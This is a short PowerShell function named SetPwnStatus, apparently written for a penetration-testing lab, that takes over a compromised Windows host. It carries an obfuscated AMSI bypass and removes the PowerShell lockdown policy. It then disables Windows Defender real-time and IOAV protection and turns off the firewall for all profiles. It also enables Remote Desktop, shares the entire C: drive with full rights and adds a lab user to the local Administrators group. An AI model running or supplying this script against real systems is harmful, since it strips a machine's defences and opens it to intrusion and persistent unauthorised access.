function SetPwnStatus{

	# Get user infos
	Whoami /all

	# Set ExecutionPolicy
	Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
	Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy

	# Windows Defender
	sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
	Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' DisableAntiSpyware 0
	Set-MpPreference -DisableIOAVProtection $true
	Set-MpPreference -DisableRealtimeMonitoring $true

	# Remote Desktop
	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

	# Windows firewall
	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
	Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

	# Share
	net share SHARE=c:\ /grant:pastudent44,full

	# Add user to admin group
	net localgroup Administrators 'usfun\pastudent44' /add

}
